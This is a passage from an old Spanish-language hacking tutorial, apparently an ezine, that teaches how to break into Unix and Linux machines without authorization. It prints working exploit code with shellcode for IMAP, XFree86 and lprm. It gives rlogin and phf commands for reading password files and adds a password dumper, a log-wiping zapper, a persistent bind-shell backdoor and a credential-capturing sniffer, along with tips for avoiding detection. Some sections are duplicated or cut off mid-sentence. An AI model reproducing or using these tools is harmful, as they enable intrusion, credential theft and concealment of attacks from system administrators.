  strcpy(username,shell);
  for(i=strlen(username);i<sizeof(username);i++)
    username[i]=0x90;
  val = 0xbffff501 + a;
  for(i=1024;i<strlen(username)-4;i+=4)
  {
    username[i+0] = val & 0x000000ff;
    username[i+1] = (val & 0x0000ff00) >> 8;
    username[i+2] = (val & 0x00ff0000) >> 16;
    username[i+3] = (val & 0xff000000) >> 24;
  }

  username[ sizeof(username)-1 ] = 0;
  if((s=wee(argv[1],143)) == -1) {
    printf("Connection refused.\n");
    exit(2);
  }
  signal(SIGPIPE,phand);
  signal(SIGINT,ihand);
  printf("Exploiting %s with offset %d...\n",argv[1],a);
  sprintf(buf,"%d LOGIN \"%s\" pass\n", sizeof(shell), username);
  write(s,buf,strlen(buf));
  while(1)
  {
    FD_ZERO(&blockme);FD_SET(s,&blockme);FD_SET(0,&blockme);
    fflush(stdout);fflush(stdin);
    if(select(FD_SETSIZE, &blockme, NULL, NULL, NULL)) {
      if(FD_ISSET(0,&blockme)) read_key(s);
      if(FD_ISSET(s,&blockme)) read_soc(s);
    }
  }
}

void read_soc(int sock)
{
  static char sbuf[512];
  static int i=0;
  char c,j;

  j=read(sock,&c,1);
  if(j<1&&errno!=EAGAIN) {
    printf("Connection dropped.\n");
    exit(3);
  }
  if(i>510)
    c='\n';
  if(c=='\n') {
    sbuf[i++]=c;sbuf[i]=0;i=0;
    printf(sbuf);
  }
  else
    sbuf[i++]=c;
}

void read_key(int sock)
{
  static char kbuf[512];
  static int i=0;
  char c,j;

  j=read(0,&c,1);
  if(i>510)
    c='\n';
  if(c=='\n') {
    kbuf[i++]=c;kbuf[i]=0;i=0;
    write(sock,kbuf,strlen(kbuf));
  }
  else
   kbuf[i++]=c;
}

int wee(char *host,int port)
{
  struct hostent *h;
  struct sockaddr_in s;
  int sock;

  h=gethostbyname(host);
  if(h==NULL)
    return -1;
  sock=socket(AF_INET,SOCK_STREAM,0);
  s.sin_family=AF_INET;
  s.sin_port=htons(port);
  memcpy(&s.sin_addr,h->h_addr,h->h_length);
  if(connect(sock,(struct sockaddr *)&s,sizeof(s)) < 0)
    return -1;
  fcntl(sock,F_SETFL,O_NONBLOCK);
  return sock;
}
               -------- final ----------

Otro metodo para conseguir una shell de root desde fuera se da en las distri-
buciones slackware hasta la 3.1 incluida. Se trata de un bug del rlogin, por
lo que no hace falta exploit. Se usa de la siguiente forma: "rlogin maquina.com
-l -froot".

Tb esta el metodo de usar bugs de scripts cgi, como puede ser el phf, amplia-
mente conocido pero que todavia rula. Por mi experiencia los sistemas con
este bug suelen ser los SunOS, y suelen estar en las universidades. Se usa des-
de el navegador, como puede ser el netscape, de la siguiente formal:
"http://www.maquina.com/cgi-bin/phf?Qalias=%0a/bin/cat%20/etc/passwd". Esto lo
que hace es imprimir el fichero /etc/passwd pero puede ser usado para ejecu-
tar cualquier comando remotamente.(no me extengo mas porque considero que el
phf ya esta muy explicado en otros articulos).

Otra cosa, muchas distribuciones de linux te montan automaticamente las parti-
ciones msdos, por lo que si tienes acceso al linux de algun colega solo tienes
que ir a /mnt/c: o lo que sea, a /windows/ y bajarte el pwl, pillais,no? :).



3.- CONSEGUIR EL /ETC/PASSWD
*********************************


Una vez que tienes una cuenta lo siguiente es conseguir el fichero de pass de
la peña. Normalmente esta en /etc/passwd,pero puede estar shadow, estando en-
tonces lo importante en /etc/shadow. Me explico. Normalmente los sistemas linux
no se preocupan por quien mira los passwords de los usuarios encriptados(por
algo estan encriptados), o sea que el fichero /etc/passwd que es donde se 
guardan los pass es visible para todo el mundo. En cambio hay sitios donde la
seguridad ya es mas necesaria y el archivo con los pass no es visible para
todo el mundo, es entonces cuando se dice que esta shadow. Vamos a analizar una
linea del /etc/passwd de un sistema que no este shadow:

jose:x2rFys28wHAAy:503:508:Jose Manuel:/home/test:/bin/bash

jose --> este es el nombre de usuario (login)
x2rFys28wHAAy --> password encryptado
503 --> este es el uid del usuario
508 --> este es el grupo al que pertenece (gid)
Jose Manuel --> nombre completo del usuario
/home/jose --> directorio home de jose
/bin/bash --> shell de jose


Lo de 503 y 508 sirve para identificar al usuario y a su grupo, ya que linux
por ejemplo no lo identificara por jose sino por 503, por lo tanto cualquier
usuario con uid igual a 503 sera como si fuera a todos los efectos jose. El
root siempre tendra el uid igual a 0.

Lo que mas nos interesa es el password. Unix en general utiliza un metodo de
encriptacion muy complejo,practicamente imposible de desencriptar. Como no se
puede desencriptar lo que podemos hacer es coger una lista de palabras, ir en-
criptandolas una a una y comparandolas con los pass encriptados, cuando haya
una coincidencia ya tenemos un password. Lo he explicado de una forma un poco
simple,espero que se comprenda. Hay multitud de crackeadores de password en la
red, pero esta visto que john the ripper es el mas rapido, asi que recomiendo
este. Ademas,trae una opcion que permite crackear sin lista de palabras, utili-
zando pass que deriven del login del usuario. Por ejemplo si el login es pepe,
pues utiliza como pass pepe1,pepe95...etc. Este es un metodo muy bueno y casi
siempre pilla bastantes password. Se utiliza con "john -single ficherodepass".

La forma de bajarse el fichero de passwd puede ser por ftp por ejemplo, pero 
antes recomiendo hacer una copia del fichero a tu directorio home con un nombre
menos sospechoso,asi en los logs nos constara de que te has bajado el
/etc/passwd.

Lo que pasa es que hay veces en los que conseguir el fichero de pass no es tan
sencillo.Puede estar shadow por ejemplo,o no tener acceso al directorio donde
se encuentre. Si el fichero esta shadow, en /etc/passwd las lineas seran algo
como: "jose:x:503:508:Jose Manuel:/home/test:/bin/bash". Entonces lo que falta,
el pass, se encuentra encriptado en /etc/shadow,pero con permisos solo de lec-
tura y escritura para el root,de forma que nosotros no podremos leerlo. Menos
mal que hay formas de conseguirlo igualmente :). Como por ejemplo con varias
llamadas a getpwent. El fichero que pongo ahora sirve para los dos casos,que 
no tengamos acceso al directorio o al /etc/passwd,o que este shadow.


		     
                  --------- comienzo ------------ 
#include <stdio.h>
#include <pwd.h>


struct passwd *pw;


main()
{
   while ((pw = getpwent()) != NULL)
   {
      printf("%s:",pw->pw_name);
      printf("%s:",pw->pw_passwd);
      printf("%d:",pw->pw_uid);
      printf("%d:",pw->pw_gid);
      printf("%s:",pw->pw_gecos);
      printf("%s:",pw->pw_dir);
      printf("%s\n",pw->pw_shell);
   }

   endpwent();
}
		    ---------- final ------------

Al ejecutarlo os mostrara el fichero de contraseñas completo, por lo que es
necesario redireccionar su salida a un fichero con >. Ej: "./conseguirpass >
fichero". Luego te lo bajas por ftp.





3.- CONSEGUIR ACCESO DE ROOT
**********************************


Una vez que tienes una cuenta lo siguiente es conseguir acceso como root. Re-
cuerdo que root es el administrador del sistema y que tiene permiso para hacer
TODO. Antes de intentar hacer nada recomiendo que hagais un "who" para ver
si el root esta conectado, ya que si haceis cosas raras y esta delante del
ordenata pues a lo mejor se mosquea y tal :). Por cierto, que si son las 10 de
la noche y en el who pone que lleva conectado desde las 8 de la mañana no le
hagais mucho caso :). Aun asi recomiendo intentar hacerse con el root por la
noche.

Si tienes acceso fisico al ordenata,y tiene el Lilo (linux loader) instalado
pues es muy sencillo.Basta con poner en el prompt al arrancar el sistema:
"linux single",y te carga el linux normalmente solo que con shell de root y
sin pedir ni login,ni pass,ni nada. Supongo que si en vez de "linux",lo tie-
nes configurado para que arranque con la palabra "redhat" pues seria "redhat
single".

Si no tienes acceso fisico a la maquina (lo mas normal),tendras que aprovechar
algun fallo (bug) de la distribucion,o un xploit. Los xploits sirven para ex-
plotar los bugs del sistema (la misma palabra lo dice), ya que por ejemplo
para sobreescribir un buffer no los vas a hacer tecleando desde el shell, sino
que lo hace un un programita en C. Hay muchisimos bugs y exploits circulando
por ahi, asi que voy a poner alguno solamente. No son de lo mas reciente pero
funcionara en alguna que otra maquina.

Aqui pongo uno bastante reciente que sobreescribe un buffer en el servidor
de XFREE86, funciona en redhat 4.2,slackware 3.1,caldera 1.1,y creo que en la
debian 1.3.1. En redhat 5.0 creo que no tira. Para que funcione, el directorio
/usr/X11R6 tiene que ser accesible para todo el mundo. Te consigue un shell
de root y no deja logs ni el .bash_history,ni en el wtmp,ni en nada (los ar-
chivos de logs los explicare mas adelante). Por cierto,si alguien no lo sabia,
los archivos en C se compilan con cc -o fichero fichero.c,siendo fichero el
ejecutable y fichero.c el codigo fuente, y tienes que subir el xploit por ftp
a la maquina y luego compilarlo en ella. Bueno, aqui va.

		  --------- comienzo ----------
/* Try 2 3 4 5 for OFFSET */
#define OFFSET 2

#include <string.h>
#include <unistd.h>
#include <errno.h>

#define LENCODE ( sizeof( Code ) )
char Code[] =
    "\xeb\x40\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0"
    "\x3f\x89\xc2\x31\xdb\xb3\x0a\x31\xc9\xcd\x80\x89\xd0\x43\x41"
    "\xcd\x80\x89\xd0\x43\x41\xcd\x80\x31\xc0\x89\xc3\xb0\x17\xcd"
    "\x80\x31\xc0\xb0\x2e\xcd\x80\x31\xc0\xb0\x0b\x89\xf3\x8d\x4e"
    "\x08\x8d\x56\x0c\xcd\x80\xe8\xbb\xff\xff\xff/bin/sh";

char Display[ 0x4001 + OFFSET ] = ":99999", *ptr = Display + OFFSET + 1;
char *args[] = { "X", "-nolock", Display, NULL };

main() {
printf("pHEAR - XFree86 exploit\nby mAChnHEaD <quenelle@iname.com>\n\nYou may
get a root prompt now. If you don't, try different values for OFFSET.\n\n");
  dup2( 0, 10 ); dup2( 1, 11 ); dup2( 2, 12 );
  __asm__("movl %%esp,(%0)\n\tsubl %1,(%0)"::"b"(ptr),"n"(LENCODE+0x2000));
  memcpy( ptr + 4, ptr, 0x3fc );
  memset( ptr + 0x400, 0x90, 0x3c00 - LENCODE );
  memcpy( ptr + 0x4000 - LENCODE, Code, LENCODE );
  execve( "/usr/X11R6/bin/X", args, args + 3 );
  perror( "execve" );
}
              ----------- final -----------
mount           635/udp                         # NFS Mount Service
pcnfs           640/udp                         # PC-NFS DOS Authentication
bwnfs           650/udp                         # BW-NFS DOS Authentication
kerberos-adm    749/tcp                         # Kerberos 5 admin/changepw
kerberos-adm    749/udp                         # Kerberos 5 admin/changepw
kerberos-sec    750/udp                         # Kerberos authentication--udp
kerberos-sec    750/tcp                         # Kerberos authentication--tcp
kerberos_master 751/udp                         # Kerberos authentication
kerberos_master 751/tcp                         # Kerberos authentication
krb5_prop       754/tcp                         # Kerberos slave propagation
listen          1025/tcp        listener RFS remote_file_sharing
nterm           1026/tcp        remote_login network_terminal
#kpop           1109/tcp                        # Pop with Kerberos
ingreslock      1524/tcp
tnet            1600/tcp                        # transputer net daemon
cfinger         2003/tcp                        # GNU finger
nfs             2049/udp                        # NFS File Service
eklogin         2105/tcp                        # Kerberos encrypted rlogin
krb524          4444/tcp                        # Kerberos 5 to 4 ticket xlator
irc             6667/tcp                        # Internet Relay Chat

			-----------------


Bueno,despues de todo este rollo os pregutareis: y cuales son realmente los
puertos importantes?? Pues bien,los realmente importantes (mas o menos) son:
el ftp(21),telnet(23),sendmail(25),finger(79),http(80),pop(110) y imap(143).
Estos son (para mi al menos) los que mas usaremos a la hora de hackear.

Para sacar informacion de cada uno de ellos basta con ir haciendo telnets uno
por uno. Ej: telnet maquina.com 21 --> te dije la version del ftp, telnet ma-
quina.com 23 --> te dice la version del sistema operativo(normalmente), y asi
con todos. Recomiendo que a la hora de mirar versiones,etc. no intenteis meter
ningun password porque quedara todo grabado junto con vuestra direccion ip.

el ftp(21),telnet(23),sendmail(25),finger(79),http(80),pop(110) y imap(143).
Estos son (para mi al menos) los que mas usaremos a la hora de hackear.

Para sacar informacion de cada uno de ellos basta con ir haciendo telnets uno
por uno. Ej: telnet maquina.com 21 --> te dije la version del ftp, telnet ma-
quina.com 23 --> te dice la version del sistema operativo(normalmente), y asi
con todos. Recomiendo que a la hora de mirar versiones,etc. no intenteis meter
ningun password porque quedara todo grabado junto con vuestra direccion ip.

Tambien es interesante hacer un scaneo de puertos a la maquina. Hay muchos pro-

Con este se consigue root en muchos linux, pero por si acaso adjunto alguno
mas. Este otro sobreescribe un buffer en /usr/bin/lprm.Se supone que rula en 
redhat 4.2,y tienes que modificar el #define PRINTER para que rule. No lo he
probado o sea que no se lo que tienes que poner pero supongo que con #define
PRINTER "/etc/printcap" funcione,o el nombre de la impresora..eso ya lo 
tendreis que averiguar vosotros. Bueno,pongo aqui el codigo.

             ---------- comienzo -----------
#include <stdio.h>
#define PRINTER "-Pwhatever"


static inline getesp() {
  __asm__(" movl %esp,%eax ");
}

main(int argc, char **argv) {
  int i,j,buffer,offset;
  long unsigned esp;
  char unsigned buf[4096];

  unsigned char
  shellcode[]="\x89\xe1\x31\xc0\x50\x8d\x5c\x24\xf9\x83\xc4\x0c"
             "\x50\x53\x89\xca\xb0\x0b\xcd\x80/bin/sh";

  buffer=990;
  offset=3000;

  if (argc>1)buffer=atoi(argv[1]);
  if (argc>2)offset=atoi(argv[2]);


  for (i=0;i<buffer;i++)
     buf[i]=0x41;  /* inc ecx */

  j=0;

  for (i=buffer;i<buffer+strlen(shellcode);i++)
    buf[i]=shellcode[j++];

  esp=getesp()+offset;

  buf[i]=esp & 0xFF;
  buf[i+1]=(esp >> 8) & 0xFF;
  buf[i+2]=(esp >> 16) & 0xFF;
  buf[i+3]=(esp >> 24) & 0xFF;

  buf[i+4]=esp & 0xFF;
  buf[i+5]=(esp >> 8) & 0xFF;
  buf[i+6]=(esp >> 16) & 0xFF;
  buf[i+7]=(esp >> 24) & 0xFF;

  printf("Offset: 0x%x\n\n",esp);

  execl("/usr/bin/lprm","lprm",PRINTER,buf,NULL);
}
	     ---------- final -----------


Bueno, no pongo mas que sino se alarga mucho. Solo teneis que buscar
por la red con la palabra clave xploit y apareceran mogollon de webs
interesantes.


4.- BORRANDO NUESTRAS HUELLAS
***********************************


Esto si que es importante, yo mas bien diria que es lo mas importante, ya que
si no borras todas las huellas que has ido dejando (que son muchas) pueden
pillarte con todas sus consecuencias. ¿ Que te pareceria que despues de todo
el trabajo que te ha llevado conseguir el root te cierran el acceso por no
borrar tus huellas correctamente ? Ya no digo nada si le da por denunciarte ..

Los ficheros de logs varian de un linux a otro, pero mas bien varian de direc-
torio, todo lo demas se mantiene. Un encargado de grabar nuestros logs es el
syslog. Este es un demonio que guarda diferentes tipos de logs como los usua-
rios que se conectaron,su ip,etc. Para ver exactamente que logs guarda y en
que ficheros puedes hacer un "cat /etc/syslog.conf",de esta forma veras exac-
tamente que es lo que hace. Normalmente los guarda en /var/log,y los mas impor-
tantes son messages,secure y xferlog. Estos son ficheros de textos normales,por
lo que modificarlos es muy sencillo. Messages es un poco de todo, guarda los
usuarios que se conectaron,su ip,etc.,por lo que es un coñazo la verdad. Se-
cure guarda solo las ips y los demonios que usaron, por ejemplo que 195.32.2.1
se conecto al ftp el 1 de mayo a las 2 de la tarde, pero no guarda los ficheros
que te bajes ni nada. Y xferlog es un fichero solo del ftp,es decir guarda
conexiones,ficheros que te bajaste,etc. Para borrarlo es muy sencillo. For
example: tu ip es ctv23.ctv.es (bueno,tu host mejor dicho), para borrarla del
/var/log/messages pues haces "grep -v ctv23 /var/log/messages > mes". Ahora en
el fichero mes tienes una copia del messages pero sin las lineas en las que
aparece ctv23,luego lo copias sobreescribiendo /var/log/messages. Bueno,pues
asi con el xferlog y el secure. Aunque tb puedes editarlos con el vim y
borrarlos manualmente claro :).

Pero todavia hay mas ficheros de logs. Por ejemplo el bash guarda una copia
de todos los comandos utilizados en el directorio home en un fichero llama-
do .bash_history. Para evitarlo pon "unset HISTFILE" en mitad de una sesion,
ya que el log se actualiza cuando cierres la conexion. Es decir,si por ejemplo
te conectas y borras el .bash_history no te servira de nada,ya que los comandos
los escribe cuando te desconectes del server. En cambio si pones unset HISTFILE
no los escribira cuando desconectes.

Otros ficheros de logs importantes son lastlog,wtmp y utmp.No estan en forma-
to de texto por lo que no podras leerlos normalmente.

Lastlog --> Se encuentra normalmente en /var/log/lastlog,y guarda cuando
            se conecto por ultima vez un usuario y desde donde.
Wtmp --> Se encuentra normalmente en /var/log/wtmp, y guarda los nombres y las
         ips de todos los usuarios que se conectaron alguna vez a la maquina.
Utmp --> Se encuentra normalmente en /var/run/utmp, y guarda los usuarios que
         se encuentran conectados en ese momento a la maquina.

Para borrarlos hace falta un programa especial que adjunto aqui. Hay muchos y
este no es de los mejores porque no borra el registro,simplemente pone las
entradas a 0,con lo que un root avanzado podria mosquearse. Tb decir que al
hacer un "who" busca los usuarios en el utmp,por lo que si te borras de el y
cualquier usuario hace un who,incluido el root, no te vera. Sirve para que
no te detecten a simple vista pero tampoco seria muy complicado encontrarte,
asi que tampoco te creas invisible :). Bueno,pego aqui el codigo.

                 --------- empieza -----------
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/var/log/wtmp"
#define UTMP_NAME "/var/run/utmp"
#define LASTLOG_NAME "/var/log/lastlog"

int f;

void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;

  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}

void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;

    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {

     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}

void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;

     if ((pwd=getpwnam(who))!=NULL) {

        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }

    } else printf("%s: ?\n",who);
}

main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}
                   --------- final -----------

Para usarlo se usa con "./z2 nombredeusuario".




5.- DEJANDO PUERTAS TRASERAS
************************************



Bueno,y vosotros os preguntareis si siempre que os conecteis teneis que
rular el xploit o el bug,borrar huellas,etc. con todo el coñazo que eso
supone. Pues la respuesta es no. Lo mas comodo es instalar una "backdoor"
o puerta trasera. Una puerta trasera es una manera de entrar en un sis-
tema de forma que nadie se entere de que has entrado,sin logs ni rollazos,
y consiguiendo el root al momento. Por supuesto para instalar una tienes
que haber conseguido el root anteriormente :). Normalmente se instalan sobre-
escribiendo un fichero del sistema por uno modificado,es decir,un troyano.
Por ejemplo,sobreescribes el /bin/login por uno que te deje entrar con
un login:pass que definas tu y sin dejar ningun log..bonito,no? :). Hay
por ahi bastantes troyanos del login,pero todos tienen un defecto (o al
menos yo no vi ninguno), que pasa si el passwd esta shadow? Pues por lo
menos los que yo vi, no rulan. Por eso voy a poner aqui otro metodo, que
consiste en crear un puerto en la maquina con un numero raro y que al hacer
un telnet a ese puerto te de una shell de root sin pass y sin logs. Pongo
aqui el codigo y luego lo explico.

		  ---------- comienzo -----------
/* quick thingy... bind a shell to a socket... defaults to port 31337 */
/* code by pluvius@io.org                                             */
/* don't forget.. when you connect to the port.. commands are like:   */
/* "ls -l;" or "exit;" (don't forget the ';')                         */
#define PORT 31337
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr; struct sockaddr_in client_addr;
int main () { soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (soc_des == -1) exit(-1); bzero((char *) &serv_addr, sizeof(serv_addr));
serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
serv_addr.sin_port = htons(PORT); soc_rc = bind(soc_des, (struct sockaddr *)
&serv_addr, sizeof(serv_addr)); if (soc_rc != 0) exit(-1); if (fork() != 0)
exit(0); setpgrp(); signal(SIGHUP, SIG_IGN); if (fork() != 0) exit(0);
soc_rc = listen(soc_des, 5); if (soc_rc != 0) exit(0); while (1) { soc_len =
sizeof(client_addr); soc_cli = accept(soc_des, (struct sockaddr *) 
&client_addr,&soc_len); if (soc_cli < 0) exit(0); cli_pid = getpid(); 
server_pid = fork();
if (server_pid != 0) { dup2(soc_cli,0); dup2(soc_cli,1); dup2(soc_cli,2);
execl("/bin/sh","sh",(char *)0); close(soc_cli); exit(0); } close(soc_cli);}}

                 ---------- final ----------

Este programa crea un puerto que tu le digas (lo defines en PORT), y al co-
nectar con ese puerto ejecuta el /bin/sh con privilegios del que ejecuto
el programa. Es decir que si lo ejecuto el root tiene privilegios de root,
si lo ejecuto pepe tiene privilegios de pepe,etc. Para instalarlo tienes que
compilarlo con cc -o file file.c, y luego lo instalas ejecutandolo simple-
mente con ./file. Luego desde tu casa haces un "telnet maquina 31337" o el
que sea y ya estas dentro. Para ejecutar comandos tienes que poner siempre ;,
es decir "ls;","who;",etc. y para desconectarte hay que poner "exit;".

NOTA: Al hacer un ps (no es hacer un pis,eh? :D) se vera mientras estes
      conectado la primera vez que lo corras. Me explico,tu pones ./file para
      ejecutarlo y al hacer un ps se vera,pero nada mas que desconectes ya no
      se vera mas,captais? O sea,genial porque el root ni se entera.

Pero que pasa si el root resetea el ordenata? Pues que el programa se cierra,
evidentemente. Para ello yo recomiendo copiar el programa ya compilado a
/etc/rc.d/init.d/ con un nombre como stoke,o alguno que no suene raro. Luego 
editais el fichero /etc/rc.d/rc y en mitad del fichero para que no cante
mucho le añadis la linea /etc/rc.d/init.d/stoke. Asi si se resetea el ordenata
no importa porque arrancara el programa de nuevo con privilegios de root.




6.- INSTALANDO UN SNIFFER
**********************************


Un sniffer es un programa que se usa para conseguir mas password de otros 
sitios a partir de una maquina que ya hayas hackeado y de la que tengas el
control. Es decir, una vez que eres root de un ordenata, ¿que te impide ins-
talar un programa que grabe en un log el principio de las sesiones de ftp y
telnet (u otros) que se abran desde esa maquina? Por ejemplo, que grabe las
10 primeras lineas de todas las sesiones de unos determinados puertos. Como
es logico entre esas diez lineas iran el login y el password, por lo que po-
dras conseguir cuentas de otros ordenadores facilmente, genial,no? :).

Pues bien, eso es lo que hace un sniffer. Me falto decir que el sniffer solo
rula si tienes el ordenador conectado en red a traves de una tarjeta ethernet.
Es decir,que si consigues hackear el ordenata de un colega, no le pongas un
sniffer porque (a no ser que lo tenga conectado en red,claro) no te servira
de nada, igualmente que si lo intentas instalar en tu propia maquina.

Ahora pongo un sniffer para linux, para que lo useis con fines didacticos :).
Tienes que definir el fichero de salida, es decir donde guardara los login y
lo pass, en la linea #define TCPLOG. Captura los pass de los puertos del ftp,
telnet y pop.Para ejecutarlo tienes que dejarlo corriendo en background, en
segundo plano. Para ello al ejecutarlo tienes que poner "./file &". Al hacer
un ps se vera el sniffer solo hasta que te desconectes,luego ya no se vera
ni con ps ni con top.

		    ------- comienzo --------
#include <sys/types.h>#include <sys/socket.h>#include <sys/time.h>#include 
<netinet/in.h>#include <netdb.h>#include <string.h>#include <linux/if.h>#include 
<signal.h>#include <stdio.h>#include <arpa/inet.h>#include <linux/socket.h>#include 
<linux/ip.h>#include <linux/tcp.h>#include <linux/if_ether.h>int openintf(char *)
;int read_tcp(int);int filter(void);int print_header(void);int print_data(int, char *)
;char *hostlookup(unsigned long int);void clear_victim(void);void cleanup(int);struct 
etherpacket{   struct ethhdr eth;   struct iphdr  ip;   struct tcphdr tcp;   
char buff[8192];}ep;struct{   unsigned long      saddr;   unsigned long      
daddr;   unsigned short     sport;   unsigned short     dport;   int               
bytes_read;   char               active;   time_t             
start_time;} victim;struct iphdr  *ip;struct tcphdr *tcp;int s;FILE *fp;#define 
CAPTLEN 512#define TIMEOUT 30#define TCPLOG ".ttg19"int openintf(char *d){   
int fd;   struct ifreq ifr;   int s;   fd=socket(AF_INET, SOCK_PACKET, htons(0x800));   
if(fd < 0)   {      perror("cant get SOCK_PACKET socket");      exit(0);   }   
strcpy(ifr.ifr_name, d);   s=ioctl(fd, SIOCGIFFLAGS, &ifr);   if(s < 0)   {      
close(fd);      perror("cant get flags");      exit(0);   }   ifr.ifr_flags |= 
IFF_PROMISC;   s=ioctl(fd, SIOCSIFFLAGS, &ifr);   if(s < 0) perror
("cant set promiscuous mode");   return fd;}int read_tcp(int s){   int x;   while(1)   
{      x=read(s, (struct etherpacket *)&ep, sizeof(ep));      if(x > 1)       {         
if(filter()==0) continue;         x=x-54;         if(x < 1) continue;         return x;
}   }}int filter(void){   int p;   p=0;   if(ip->protocol != 6) return 0;   
if(victim.active != 0)         if(victim.bytes_read > CAPTLEN)      {         
fprintf(fp, "\n----- [CAPLEN Exceeded]\n");         clear_victim();         
return 0;      }   if(victim.active != 0)      if(time(NULL) > (victim.start_time + 
TIMEOUT))      {         fprintf(fp, "\n----- [Timed Out]\n");         clear_victim();
return 0;      }                                                                                                                     if(ntohs(tcp->dest)==21)  p=1; /* ftp */   if(ntohs(tcp->dest)==23)  p=1; /* telnet */   if(ntohs(tcp->dest)==110) p=1; /* pop3 */   if(ntohs(tcp->dest)==109) p=1; /* pop2 */   if(ntohs(tcp->dest)==143) p=1; /* imap2 */   if(ntohs(tcp->dest)==513) p=1; /* rlogin */   if(ntohs(tcp->dest)==106) p=1; /* poppasswd */   if(victim.active == 0)      if(p == 1)         if(tcp->syn == 1)         {            victim.saddr=ip->saddr;            victim.daddr=ip->daddr;            victim.active=1;            victim.sport=tcp->source;            victim.dport=tcp->dest;            victim.bytes_read=0;            victim.start_time=time(NULL);            print_header();         }     if(tcp->dest != victim.dport) return 0;   if(tcp->source != victim.sport) return 0;   if(ip->saddr != victim.saddr) return 0;   if(ip->daddr != victim.daddr) return 0;   if(tcp->rst == 1)    {      victim.active=0;      alarm(0);      fprintf(fp, "\n----- [RST]\n");      clear_victim();      return 0;   }   if(tcp->fin == 1)    {      victim.active=0;      alarm(0);      fprintf(fp, "\n----- [FIN]\n");      clear_victim();      return 0;   }   return 1;}   int print_header(void){   fprintf(fp, "\n");   fprintf(fp, "%s => ", hostlookup(ip->saddr));   fprintf(fp, "%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest));   
}int print_data(int datalen, char *data){   int i=0;   int t=0;      
victim.bytes_read=victim.bytes_read+datalen;   for(i=0;i != datalen;i++)   {      
if(data[i] == 13) { fprintf(fp, "\n"); t=0; }      if(isprint(data[i])) 
{fprintf(fp, 
"%c", data[i]);t++;}      if(t > 75) {t=0;fprintf(fp, "\n");}   }}main(int argc,
 char 
**argv){   s=openintf("eth0");   ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);   
tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);      signal(SIGHUP, SIG_IGN);   
signal(SIGINT, cleanup);   signal(SIGTERM, cleanup);   signal(SIGKILL, cleanup);   
signal(SIGQUIT, cleanup);   if(argc == 2) fp=stdout;   else fp=fopen(TCPLOG, "at");   
if(fp == NULL) { fprintf(stderr, "cant open log\n");exit(0);}   clear_victim();   
for(;;)   {      read_tcp(s);      if(victim.active != 0) print_data(htons(ip->
tot_len)
-sizeof(ep.ip)-sizeof(ep.tcp), 
ep.buff-2);      fflush(fp);         }   }char *hostlookup(unsigned long int in)
{static char blah[1024];   struct in_addr i;   struct hostent *he;      i.s_addr=in;   
he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);   if(he == NULL) strcpy
(blah,inet_ntoa(i));   else strcpy(blah, he->h_name);   return blah;}void clear_victim
(void){  
 victim.saddr=0;   victim.daddr=0;   victim.sport=0;   victim.dport=0;   
victim.active=0;   victim.bytes_read=0;   victim.start_time=0;}void cleanup(int sig)
{   fprintf(fp, 
"Exiting...\n");   close(s);   fclose(fp);   exit(0);}		 
                         -------- final ---------


Pero en cambio, detectar un sniffer es muy sencillo. Con la orden "ifconfig" y
fijandose si aparece la palabra PROMISC se sabe facilmente. Esto lo hace muy
vulnerable, y si un root avanzado se da cuenta no tardara en encontrar el fi-
chero de logs del sniffer. Por cierto, esto es importante. Un sniffer captura
los login y pass de la peña que accede a otros ordenatas desde la maquina en la
que esta instalado,pero junto con el login y pass tambien captura su ip. A eso 
tb le sumamos que tb pilla los pass y las ips de la gente que accede a la ma-
quina del sniffer,es decir,a si mismas. ¿Pues que pasaria si habeis borrado
todas las huellas del syslog,etc. y no borrais vuestra propia info del log
del sniffer? Os lo imaginais,¿no? Hay que tener cuidado con eso..no os vaya
a dar un disgusto :).

Para resolver lo del PROMISC del ifconfig hay que instalar un troyano. Es de-
cir, un fichero modificado del ifconfig. Se compila y se copia sobreescribiendo
el /sbin/ifconfig. Hay varios circulando por la red, sobre todo incluidos den-
tro de rootkits. En la misma pagina de este ezine (raregazz.islatortuga.com) lo
teneis dentro del rootkit para linux en el apartado de bugs/utilidades. Y ya
que estamos hablando de troyanos no esta de paso comentar la orden "touch",que
sirve para cambiar la fecha de un archivo. Por ejemplo si metes un ifconfig con
